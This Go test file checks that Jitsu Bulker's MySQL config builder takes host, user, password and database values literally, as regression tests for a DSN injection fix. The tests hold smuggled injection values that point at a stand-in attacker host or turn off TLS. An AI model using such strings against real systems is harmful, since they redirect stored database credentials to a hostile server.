package sql

import (
	"testing"
	"time"

	"github.com/go-sql-driver/mysql"
	bulker "github.com/jitsucom/bulker/bulkerlib"
	"github.com/stretchr/testify/require"
)

func mysqlTestConfig() *DataSourceConfig {
	return &DataSourceConfig{Host: "db.customer.com", Port: 3306, Username: "jitsu", Password: "STORED-PW", Db: "events"}
}

func TestMySQLDriverConfigPlainValues(t *testing.T) {
	config := mysqlTestConfig()
	config.Parameters = map[string]string{"tls": "preferred", "timeout": "60s", "readTimeout": "30s", "charset": "utf8mb4,utf8"}
	cfg, err := mySQLDriverConfig(config)
	require.NoError(t, err)
	require.Equal(t, "tcp", cfg.Net)
	require.Equal(t, "db.customer.com:3306", cfg.Addr)
	require.Equal(t, "jitsu", cfg.User)
	require.Equal(t, "STORED-PW", cfg.Passwd)
	require.Equal(t, "events", cfg.DBName)
	// driver options still come from the parameters
	require.Equal(t, 60*time.Second, cfg.Timeout)
	require.Equal(t, 30*time.Second, cfg.ReadTimeout)
	require.Equal(t, "preferred", cfg.TLSConfig)
}

// For ordinary values the new config is exactly what the old DSN string parsed to, with Bulker's default parameters.
func TestMySQLDriverConfigMatchesTheOldDSNForOrdinaryValues(t *testing.T) {
	config := mysqlTestConfig()
	config.Parameters = map[string]string{"tls": "preferred", "timeout": "60s", "writeTimeout": "60s", "readTimeout": "60s", "charset": "utf8mb4,utf8"}
	oldDSN := "jitsu:STORED-PW@tcp(db.customer.com:3306)/events?charset=utf8mb4,utf8&readTimeout=60s&timeout=60s&tls=preferred&writeTimeout=60s"
	old, err := mysql.ParseDSN(oldDSN)
	require.NoError(t, err)
	cfg, err := mySQLDriverConfig(config)
	require.NoError(t, err)
	require.Equal(t, old.FormatDSN(), cfg.FormatDSN())
}

// The attack of JITSU-270: the database was formatted into the DSN, which is split at its last '@' and '/'.
func TestMySQLDriverConfigValuesAreTakenLiterally(t *testing.T) {
	for _, db := range []string{
		"x@tcp(attacker.example:3306)/events",
		"events?allowCleartextPasswords=true&tls=false",
		"events/../other",
		"events@evil",
		"a b",
	} {
		config := mysqlTestConfig()
		config.Db = db
		cfg, err := mySQLDriverConfig(config)
		require.NoError(t, err)
		require.Equal(t, "db.customer.com:3306", cfg.Addr, "database=%q", db)
		require.Equal(t, "jitsu", cfg.User, "database=%q", db)
		require.Equal(t, "STORED-PW", cfg.Passwd, "database=%q", db)
		require.Equal(t, db, cfg.DBName)
		require.False(t, cfg.AllowCleartextPasswords, "database=%q", db)
	}
}

func TestMySQLDriverConfigUsernameAndPasswordWithDelimiters(t *testing.T) {
	// Azure style user@server names worked in the string form and must keep working; the others used to break the parse
	for _, user := range []string{"user@servername", "jitsu@tcp(attacker.example:3306)/x", "a:b", "a/b"} {
		config := mysqlTestConfig()
		config.Username = user
		cfg, err := mySQLDriverConfig(config)
		require.NoError(t, err)
		require.Equal(t, user, cfg.User)
		require.Equal(t, "STORED-PW", cfg.Passwd)
		require.Equal(t, "db.customer.com:3306", cfg.Addr)
	}
	for _, password := range []string{"p@ss", "p:ss", "p/ss", "p?s&s=1", "p(s)", "pässwörd"} {
		config := mysqlTestConfig()
		config.Password = password
		cfg, err := mySQLDriverConfig(config)
		require.NoError(t, err)
		require.Equal(t, password, cfg.Passwd)
		require.Equal(t, "jitsu", cfg.User)
		require.Equal(t, "db.customer.com:3306", cfg.Addr)
		require.Equal(t, "events", cfg.DBName)
	}
}

func TestMySQLDriverConfigParameterValuesAreEscaped(t *testing.T) {
	config := mysqlTestConfig()
	config.Parameters = map[string]string{"sql_mode": "A&B=C", "time_zone": "'+00:00'"}
	cfg, err := mySQLDriverConfig(config)
	require.NoError(t, err)
	require.Equal(t, "A&B=C", cfg.Params["sql_mode"])
	require.Equal(t, "'+00:00'", cfg.Params["time_zone"])
	require.Equal(t, "db.customer.com:3306", cfg.Addr)
}

func TestMySQLDriverConfigIPv6AndPort(t *testing.T) {
	config := mysqlTestConfig()
	config.Host = "::1"
	config.Port = 3307
	cfg, err := mySQLDriverConfig(config)
	require.NoError(t, err)
	require.Equal(t, "[::1]:3307", cfg.Addr)
}

// The driver derives the TLS server name from the address when it normalizes the config: parsing the parameters
// against its default address must not leave 127.0.0.1 behind as the name to verify.
func TestMySQLDriverConfigLeavesTLSToTheDriver(t *testing.T) {
	config := mysqlTestConfig()
	config.Parameters = map[string]string{"tls": "true"}
	cfg, err := mySQLDriverConfig(config)
	require.NoError(t, err)
	require.Nil(t, cfg.TLS)
	require.Equal(t, "true", cfg.TLSConfig)
	_, err = mySQLConnector(config)
	require.NoError(t, err)
}

func TestMySQLDriverConfigRejectsBrokenParameters(t *testing.T) {
	config := mysqlTestConfig()
	config.Parameters = map[string]string{"timeout": "not-a-duration"}
	_, err := mySQLDriverConfig(config)
	require.Error(t, err)
}

// End to end, against the MySQL container the other tests use: a database that carries a second address must be taken
// as a database name. Formatted into the DSN, the client dialed attacker.example instead.
func TestMySQLDatabaseNameCannotAddAnAddress(t *testing.T) {
	if mysqlContainer == nil {
		t.Skip("needs the MySQL test container (BULKER_TEST_CONFIGS=mysql or all)")
	}
	dsc := DataSourceConfig{
		Host:       mysqlContainer.Host,
		Port:       mysqlContainer.Port,
		Username:   mysqlContainer.Username,
		Password:   mysqlContainer.Password,
		Db:         "x@tcp(attacker.example:3306)/" + mysqlContainer.Database,
		Parameters: map[string]string{"tls": "false", "allowCleartextPasswords": "true"},
	}
	b, err := NewMySQL(bulker.Config{Id: "dsn-injection", BulkerType: MySQLBulkerTypeId, DestinationConfig: dsc})
	if b != nil {
		_ = b.Close()
	}
	require.Error(t, err)
	// the configured server answered and took the whole string as a database name; it did not go looking for another host
	require.Contains(t, err.Error(), "Unknown database 'x@tcp(attacker.example:3306)/")
	require.NotContains(t, err.Error(), "no such host")
	require.NotContains(t, err.Error(), "lookup attacker.example")
}
